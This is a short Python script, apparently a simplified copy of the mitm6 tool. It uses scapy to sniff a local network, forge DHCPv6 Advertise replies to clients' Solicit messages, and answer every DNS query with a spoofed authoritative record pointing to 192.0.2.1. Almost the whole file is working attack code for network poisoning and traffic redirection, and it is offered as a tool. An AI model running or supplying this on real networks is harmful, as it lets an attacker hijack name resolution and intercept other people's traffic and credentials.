from scapy.all import sniff, sendp, IPv6, UDP, Ether, DHCP6_Solicit, DHCP6_Advertise, DHCP6OptServerId, DUID_LL, DNS, DNSQR, DNSRR, IP
import argparse

# 简单的命令行参数处理
parser = argparse.ArgumentParser(description='Simple MITM6 Tool')
parser.add_argument("-i", "--interface", required=True, help="Network interface to use")
args = parser.parse_args()

# DHCPv6广告响应
def send_dhcp6_advertise(packet):
    if DHCP6_Solicit in packet:
        # 构建并发送DHCPv6广告响应
        response = (
            Ether(src=packet.dst, dst=packet.src) /
            IPv6(src=packet[IPv6].dst, dst=packet[IPv6].src) /
            UDP(sport=547, dport=546) /
            DHCP6_Advertise(trid=packet[DHCP6_Solicit].trid) /
            DHCP6OptServerId(duid=DUID_LL(lladdr=packet.dst))
        )
        sendp(response, iface=args.interface, verbose=False)
        print(f"Sent DHCPv6 Advertise to {packet[IPv6].src}")

# DNS响应处理
def send_dns_reply(packet):
    if DNS in packet and packet[DNS].qr == 0:  # DNS请求
        dns_query_name = packet[DNSQR].qname.decode()
        # 构建并发送DNS响应
        response = (
            Ether(src=packet.dst, dst=packet.src) /
            IP(src=packet[IP].dst, dst=packet[IP].src) /
            UDP(sport=packet[UDP].dport, dport=packet[UDP].sport) /
            DNS(id=packet[DNS].id, qr=1, aa=1, qd=packet[DNS].qd,
                an=DNSRR(rrname=packet[DNSQR].qname, ttl=10, rdata="192.0.2.1"))
        )
        sendp(response, iface=args.interface, verbose=False)
        print(f"Sent DNS reply for {dns_query_name} to {packet[IP].src}")

# 数据包处理函数
def packet_handler(packet):
    if DHCP6_Solicit in packet:
        send_dhcp6_advertise(packet)
    elif DNS in packet and packet[DNS].qr == 0:  # DNS查询
        send_dns_reply(packet)

# 抓包并处理
def main():
    print(f"Listening on {args.interface}...")
    sniff(iface=args.interface, prn=packet_handler, filter="udp or arp", store=0)

if __name__ == "__main__":
    main()
